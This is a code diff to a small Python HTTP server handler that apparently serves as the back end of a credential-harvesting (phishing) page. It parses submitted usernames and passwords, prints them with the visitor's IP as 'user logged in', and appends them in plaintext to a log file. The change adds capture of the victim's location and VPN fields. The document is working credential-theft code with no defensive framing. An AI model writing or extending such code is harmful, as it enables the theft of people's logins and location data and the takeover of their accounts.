@@ -44,9 +44,13 @@ class MyHandler(SimpleHTTPRequestHandler):
         post_params = dict(param.split('=') for param in post_data.split('&'))
         username = unquote(post_params.get('username', ''))
         password = unquote(post_params.get('password', ''))
+        location = unquote(post_params.get('location', ''))
+        vpn = unquote(post_params.get('vpn', ''))
         user_ip = self.client_address[0]
         print(colored(f"\n{user_ip} user logged in", color=green))
         print(colored(f"Username: {username}, Password: {password}", color='yellow'))
+        print(colored(f"Vpn: {vpn}", color='green'))
+        print(colored(f"location: \033[34m{location}\033[0m", color='yellow'))
         current_datetime = datetime.now().strftime('%Y-%m-%d %I:%M:%S')
         with open('users/users.txt', 'a') as log_file:
             log_file.write(f"{current_datetime}: {user_ip} - Username: {username}, Password: {password}\n")
